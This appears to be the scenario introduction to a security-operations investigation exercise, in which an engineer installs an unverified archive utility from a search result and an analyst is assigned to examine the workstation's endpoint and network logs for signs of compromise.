**Scenario**

Just working on a typical day as a software engineer, Perry received an encrypted 7z archive from his boss containing a snippet of a source code that must be completed within the day. Realising that his current workstation does not have an application that can unpack the file, he spins up his browser and starts to search for software that can aid in accessing the file. Without validating the resource, Perry immediately clicks the first search engine result and installs the application.

Last September 26, 2023, one of the security analysts observed something unusual on the workstation owned by Perry based on the generated endpoint and network logs. Given this, your SOC lead has assigned you to conduct an in-depth investigation on this workstation and assess the impact of the potential compromise.
